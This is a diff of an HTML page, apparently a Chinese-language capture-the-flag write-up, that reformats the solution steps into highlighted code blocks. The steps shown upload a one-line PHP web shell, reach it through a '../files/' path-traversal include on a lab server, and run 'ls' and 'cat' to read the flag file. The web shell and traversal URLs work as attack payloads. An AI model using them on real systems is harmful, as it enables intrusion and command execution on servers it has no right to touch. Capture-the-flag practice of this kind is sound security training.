@@ -624,9 +624,11 @@ index.php
 <p>裡面輸入<br><code>&lt;?php system($_GET['x']);</code></p>
 <p>上傳檔案之後把他拿去 curl 可以得到網址<br>因為網址前面有 file 所以可以知道他在 file 裡面</p>
 <p>把網址回前頁再加上 file 下去跑</p>
-<p><code>http://140.110.112.78:10210/?page=../files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt</code></p>
+<pre class=" language-bash"><code class="language-bash">http://140.110.112.78:10210/?page<span class="token operator">=</span><span class="token punctuation">..</span>/files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt
+</code></pre>
 <p>可以看到是 ok 的！只是 system 沒有執行，因為沒有輸入 x 所以再加上 x</p>
-<p><code>http://140.110.112.78:10210/?page=../files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt&amp;x=ls</code></p>
+<pre class=" language-bash"><code class="language-bash">http://140.110.112.78:10210/?page<span class="token operator">=</span><span class="token punctuation">..</span>/files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt<span class="token operator">&amp;</span>x<span class="token operator">=</span>ls
+</code></pre>
 <p>會出現<code>files flag_1223b8c30a347321299611f873b449ad.txt index.php mods upload.php </code></p>
 <p>再用<code>x=</code>去抓 flag 就可以得到了</p>
 <pre class=" language-bash"><code class="language-bash">http://140.110.112.78:10210/?page<span class="token operator">=</span><span class="token punctuation">..</span>/files/dd0bf9bdec1a52e905c05f98f8cc8ae9/93bc3c03503d8768cf7cc1e39ce16fcb.txt<span class="token operator">&amp;</span>x<span class="token operator">=</span>cat%20flag_1223b8c30a347321299611f873b449ad.txt
